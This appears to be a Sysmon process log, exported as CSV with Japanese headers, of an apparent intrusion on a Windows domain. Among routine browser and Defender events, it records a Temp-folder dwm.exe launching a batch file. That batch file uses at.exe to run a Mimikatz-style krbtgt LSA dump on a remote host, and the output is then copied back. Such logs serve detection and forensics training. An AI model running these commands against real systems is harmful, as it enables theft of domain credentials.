レベル,日付と時刻,ソース,イベント ID,タスクのカテゴリ
情報,2019/11/07 15:37:59,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:37:59.945
ProcessGuid: {CC41BF7E-54C7-5A01-0000-001090982600}
ProcessId: 2128
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-54C7-5A01-0000-00101F982600}
ParentProcessId: 5584
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""copy J:\Windows\Temp\o.txt C:\Intel\Logs\o.txt"""
情報,2019/11/07 15:37:59,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:37:59.940
ProcessGuid: {CC41BF7E-54C7-5A01-0000-00101F982600}
ProcessId: 5584
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""copy J:\Windows\Temp\o.txt C:\Intel\Logs\o.txt""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:37:45,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:37:45.011
ProcessGuid: {CC41BF7E-54B8-5A01-0000-001028952600}
ProcessId: 1512
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:37:45,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:37:45.011
ProcessGuid: {CC41BF7E-54B8-5A01-0000-0010AE942600}
ProcessId: 2552
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:37:44,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:37:44.948
ProcessGuid: {CC41BF7E-54B8-5A01-0000-001028952600}
ProcessId: 1512
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-54B8-5A01-0000-0010AE942600}
ParentProcessId: 2552
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""type J:\Windows\Temp\o.txt"""
情報,2019/11/07 15:37:44,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:37:44.940
ProcessGuid: {CC41BF7E-54B8-5A01-0000-0010AE942600}
ProcessId: 2552
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""type J:\Windows\Temp\o.txt""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:37:42,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:37:42.152
ProcessGuid: {CC41BF7E-54AB-5A01-0000-00107E5C2600}
ProcessId: 5032
Image: C:\Program Files\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:37:42,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:37:42.136
ProcessGuid: {CC41BF7E-54AB-5A01-0000-001012672600}
ProcessId: 6140
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:37:31,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:37:31.378
ProcessGuid: {CC41BF7E-54AB-5A01-0000-001012672600}
ProcessId: 6140
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:5032 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-54AB-5A01-0000-00107E5C2600}
ParentProcessId: 5032
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:37:31,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:37:31.233
ProcessGuid: {CC41BF7E-54AB-5A01-0000-00107E5C2600}
ProcessId: 5032
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:35:45,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:35:45.236
ProcessGuid: {CC41BF7E-542D-5A01-0000-00108C2B2600}
ProcessId: 3676
Image: C:\Program Files\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:35:45,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:35:45.221
ProcessGuid: {CC41BF7E-542D-5A01-0000-001013362600}
ProcessId: 4884
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe"
情報,2019/11/07 15:35:25,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:35:25.603
ProcessGuid: {CC41BF7E-542D-5A01-0000-001013362600}
ProcessId: 4884
Image: C:\Program Files (x86)\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files (x86)\Internet Explorer\IEXPLORE.EXE"" SCODEF:3676 CREDAT:140545 /prefetch:2
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Low
Hashes: SHA1=B2533AE4CDAA5F2B0B38A76B8EB65F12C7B225EC
ParentProcessGuid: {CC41BF7E-542D-5A01-0000-00108C2B2600}
ParentProcessId: 3676
ParentImage: C:\Program Files\Internet Explorer\iexplore.exe
ParentCommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding"
情報,2019/11/07 15:35:25,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:35:25.460
ProcessGuid: {CC41BF7E-542D-5A01-0000-00108C2B2600}
ProcessId: 3676
Image: C:\Program Files\Internet Explorer\iexplore.exe
CommandLine: ""C:\Program Files\Internet Explorer\iexplore.exe"" -Embedding
CurrentDirectory: C:\Windows\system32\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=F0FEB5350BD497A9E9BF77ED072315E64ABFFA33
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:34:46,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:46.763
ProcessGuid: {CC41BF7E-53C0-5A01-0000-0010BF562300}
ProcessId: 5164
Image: C:\Windows\System32\SearchFilterHost.exe"
情報,2019/11/07 15:34:46,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:46.763
ProcessGuid: {CC41BF7E-53C0-5A01-0000-0010B3542300}
ProcessId: 3884
Image: C:\Windows\System32\SearchProtocolHost.exe"
情報,2019/11/07 15:34:30,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:30.481
ProcessGuid: {CC41BF7E-53F5-5A01-0000-00108D0A2600}
ProcessId: 3768
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:34:30,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:30.481
ProcessGuid: {CC41BF7E-53F5-5A01-0000-0010150A2600}
ProcessId: 276
Image: C:\Windows\SysWOW64\cmd.exe"
情報,2019/11/07 15:34:30,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:30.481
ProcessGuid: {CC41BF7E-53F5-5A01-0000-0010FF0C2600}
ProcessId: 2804
Image: C:\Windows\SysWOW64\at.exe"
情報,2019/11/07 15:34:29,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:34:29.746
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:34:29,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:34:29.746
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:34:29,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:29.745
ProcessGuid: {CC41BF7E-53F5-5A01-0000-0010FF0C2600}
ProcessId: 2804
Image: C:\Windows\SysWOW64\at.exe
CommandLine: at.exe  \\win-wfbhibe5gxz 15:37 cmd /c ""C:\Windows\Temp\mz.exe ""privilege::debug"" ""lsadump::lsa /inject /name:krbtgt"" exit > C:\Windows\Temp\o.txt""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DAB503EDF518E58C03827AD4EF312702A0F37398
ParentProcessGuid: {CC41BF7E-53F5-5A01-0000-0010150A2600}
ParentProcessId: 276
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\b.bat"""
情報,2019/11/07 15:34:29,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:29.647
ProcessGuid: {CC41BF7E-53F5-5A01-0000-00108D0A2600}
ProcessId: 3768
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-53F5-5A01-0000-0010150A2600}
ParentProcessId: 276
ParentImage: C:\Windows\SysWOW64\cmd.exe
ParentCommandLine: cmd /c ""C:\Intel\Logs\b.bat"""
情報,2019/11/07 15:34:29,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:29.630
ProcessGuid: {CC41BF7E-53F5-5A01-0000-0010150A2600}
ProcessId: 276
Image: C:\Windows\SysWOW64\cmd.exe
CommandLine: cmd /c ""C:\Intel\Logs\b.bat""
CurrentDirectory: C:\Users\maebashi.gunma\Desktop\
User: EXAMPLE\maebashi.gunma
LogonGuid: {CC41BF7E-4CE6-5A01-0000-002031FB0200}
LogonId: 0x2FB31
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=A4D7B99EB716919BB47448E135D489A1100BA70C
ParentProcessGuid: {CC41BF7E-4FD9-5A01-0000-001002AE1B00}
ParentProcessId: 4964
ParentImage: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe
ParentCommandLine: C:\Users\MAEBAS~1.GUN\AppData\Local\Temp\dwm.exe  ""C:\Users\maebashi.gunma\Desktop"""
情報,2019/11/07 15:34:28,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:28.106
ProcessGuid: {CC41BF7E-53ED-5A01-0000-00106BD32300}
ProcessId: 5064
Image: C:\Windows\System32\wermgr.exe"
情報,2019/11/07 15:34:21,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:21.902
ProcessGuid: {CC41BF7E-53ED-5A01-0000-0010CDD02300}
ProcessId: 2240
Image: C:\Windows\System32\wermgr.exe"
情報,2019/11/07 15:34:21,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:21.909
ProcessGuid: {CC41BF7E-53ED-5A01-0000-00106BD32300}
ProcessId: 5064
Image: C:\Windows\System32\wermgr.exe
CommandLine: C:\Windows\system32\wermgr.exe -upload
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0C0329767FD84B8D5A00C91925DA6BE954AE6610
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:34:21,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:21.877
ProcessGuid: {CC41BF7E-53ED-5A01-0000-0010CDD02300}
ProcessId: 2240
Image: C:\Windows\System32\wermgr.exe
CommandLine: ""C:\Windows\system32\wermgr.exe"" ""-outproc"" ""0"" ""900"" ""9992"" ""8324"" ""11864"" ""0"" ""0"" ""0"" ""0"" ""0"" ""0"" ""0"" ""0"" 
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0C0329767FD84B8D5A00C91925DA6BE954AE6610
ParentProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ParentProcessId: 900
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs"
情報,2019/11/07 15:34:18,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:34:18.136
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:34:18,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:34:18.136
ProcessGuid: {CC41BF7E-4CB9-5A01-0000-0010EB030000}
ProcessId: 4
Image: System
Device: \Device\HarddiskVolume1"
情報,2019/11/07 15:34:18,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:18.139
ProcessGuid: {CC41BF7E-53EA-5A01-0000-001002BC2300}
ProcessId: 4852
Image: C:\Windows\System32\svchost.exe
CommandLine: C:\Windows\System32\svchost.exe -k wsappx
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0DAC68816AE7C09EFC24D11C27C3274DFD147DEE
ParentProcessGuid: {CC41BF7E-4CCC-5A01-0000-001065750000}
ParentProcessId: 552
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:16.902
ProcessGuid: {CC41BF7E-53E8-5A01-0000-001024912300}
ProcessId: 5380
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:16.886
ProcessGuid: {CC41BF7E-53E8-5A01-0000-001008942300}
ProcessId: 204
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:16.871
ProcessGuid: {CC41BF7E-53E8-5A01-0000-0010C0932300}
ProcessId: 5668
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:34:16.714
ProcessGuid: {CC41BF7E-53E8-5A01-0000-0010B89C2300}
ProcessId: 5244
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\Harddisk0\DR0"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:34:16.699
ProcessGuid: {CC41BF7E-4CD0-5A01-0000-00101AF00000}
ProcessId: 900
Image: C:\Windows\System32\svchost.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,9,RawAccessRead detected (rule: RawAccessRead),"RawAccessRead detected:
UtcTime: 2019-11-07 06:34:16.683
ProcessGuid: {CC41BF7E-53E8-5A01-0000-0010B89C2300}
ProcessId: 5244
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:16.633
ProcessGuid: {CC41BF7E-53E8-5A01-0000-0010B89C2300}
ProcessId: 5244
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
CommandLine: C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=5935A1978B114199079C01D48407894AF30C07DA
ParentProcessGuid: {CC41BF7E-4CCD-5A01-0000-0010D0890000}
ParentProcessId: 664
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k DcomLaunch"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:16.539
ProcessGuid: {CC41BF7E-53E8-5A01-0000-001008942300}
ProcessId: 204
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-53E8-5A01-0000-0010C0932300}
ParentProcessId: 5668
ParentImage: C:\Program Files\Windows Defender\MpCmdRun.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignaturesUpdateService -ScheduleJob -UnmanagedUpdate"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:16.537
ProcessGuid: {CC41BF7E-53E8-5A01-0000-0010C0932300}
ProcessId: 5668
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignaturesUpdateService -ScheduleJob -UnmanagedUpdate
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:16.511
ProcessGuid: {CC41BF7E-53E8-5A01-0000-0010658E2300}
ProcessId: 3688
Image: C:\Windows\System32\conhost.exe"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
UtcTime: 2019-11-07 06:34:16.511
ProcessGuid: {CC41BF7E-53E8-5A01-0000-00101B8E2300}
ProcessId: 5800
Image: C:\Program Files\Windows Defender\MpCmdRun.exe"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:16.501
ProcessGuid: {CC41BF7E-53E8-5A01-0000-001024912300}
ProcessId: 5380
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges -Reinvoke
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\NETWORK SERVICE
LogonGuid: {CC41BF7E-4CCE-5A01-0000-0020E4030000}
LogonId: 0x3E4
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-53E8-5A01-0000-00101B8E2300}
ParentProcessId: 5800
ParentImage: C:\Program Files\Windows Defender\MpCmdRun.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:16.469
ProcessGuid: {CC41BF7E-53E8-5A01-0000-0010658E2300}
ProcessId: 3688
Image: C:\Windows\System32\conhost.exe
CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
CurrentDirectory: C:\Windows
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354
ParentProcessGuid: {CC41BF7E-53E8-5A01-0000-00101B8E2300}
ParentProcessId: 5800
ParentImage: C:\Program Files\Windows Defender\MpCmdRun.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges"
情報,2019/11/07 15:34:16,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
UtcTime: 2019-11-07 06:34:16.465
ProcessGuid: {CC41BF7E-53E8-5A01-0000-00101B8E2300}
ProcessId: 5800
Image: C:\Program Files\Windows Defender\MpCmdRun.exe
CommandLine: ""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SignatureUpdate -ScheduleJob -RestrictPrivileges
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {CC41BF7E-4CCC-5A01-0000-0020E7030000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=4793ECD652D0186B5085997E60B5F0D9E7B58C38
ParentProcessGuid: {CC41BF7E-4CD7-5A01-0000-001056910100}
ParentProcessId: 1968
ParentImage: C:\Program Files\Windows Defender\MsMpEng.exe
ParentCommandLine: ""C:\Program Files\Windows Defender\MsMpEng.exe"""
